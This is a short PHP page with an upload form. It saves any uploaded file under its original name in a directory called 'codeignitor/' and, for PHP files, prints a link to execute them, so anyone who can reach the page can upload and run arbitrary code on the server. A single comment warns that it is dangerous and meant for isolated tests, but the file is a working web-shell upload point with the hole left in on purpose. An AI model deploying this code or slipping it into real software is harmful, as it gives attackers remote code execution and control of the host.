<?php
// WARNING: This is extremely dangerous. Use only in isolated test environments.
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadDir = 'codeignitor/';
    
    // Create upload directory if it doesn't exist
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }
    
    $fileName = basename($_FILES['file']['name']);
    $filePath = $uploadDir . $fileName;
    $fileType = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    
    // Move uploaded file
    if (move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
        echo "File uploaded successfully: " . htmlspecialchars($fileName);
        
        // If it's a PHP file, provide a link to execute it
        if ($fileType === 'php') {
            echo '<br><a href="' . $filePath . '" target="_blank">Execute PHP File</a>';
        }
    } else {
        echo "Error uploading file.";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Upload</title>
</head>
<body>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>
</body>
</html>